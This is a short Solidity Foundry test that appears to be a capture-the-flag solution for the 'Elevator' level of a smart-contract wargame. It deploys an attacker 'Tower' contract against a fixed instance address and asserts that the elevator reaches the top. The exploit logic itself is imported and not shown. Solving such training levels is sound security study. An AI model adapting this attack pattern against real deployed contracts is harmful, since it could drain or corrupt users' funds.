// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../instances/Ilevel11.sol";
import "../src/level11.sol";

contract Attacker is Test {
    Elevator level11 = Elevator(0x4Fca95b8f87310d0ddB247184df1e9e5e5D98Dd5);

    function test() external {
        Tower theDarkTower = new Tower();
        theDarkTower.takeElevator(address(level11));

        assert(level11.top());
    }
}
